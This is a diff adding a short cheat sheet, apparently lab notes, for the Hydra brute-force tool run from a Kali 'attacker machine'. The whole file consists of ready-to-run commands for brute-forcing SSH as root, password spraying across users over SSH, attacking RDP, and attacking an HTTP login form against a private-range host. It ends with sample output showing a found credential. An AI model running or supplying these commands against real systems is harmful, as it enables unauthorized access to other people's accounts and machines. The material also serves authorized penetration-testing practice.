@@ -1,0 +1,18 @@
+🧠  HYDRA (FAST SERVICE BRUTE FORCE)
+🎯 RUN ON: Kali (attacker machine)
+🔥 SSH BRUTE FORCE
+hydra -l root -P passwords.txt ssh://172.25.170.X
+🧠 Meaning:
+-l root → single username
+-P passwords.txt → password list
+ssh:// → target service
+🔥 MULTI-USER SPRAY
+hydra -L users.txt -P passwords.txt ssh://172.25.170.X
+🔥 RDP BRUTE FORCE
+hydra -L users.txt -P passwords.txt rdp://172.25.170.X
+🔥 HTTP LOGIN FORM
+hydra -L users.txt -P passwords.txt 172.25.170.X http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+🧠 OUTPUT (IMPORTANT)
+[22][ssh] host: 172.25.170.X login: admin password: password123
+
+👉 VALID CREDENTIAL FOUND
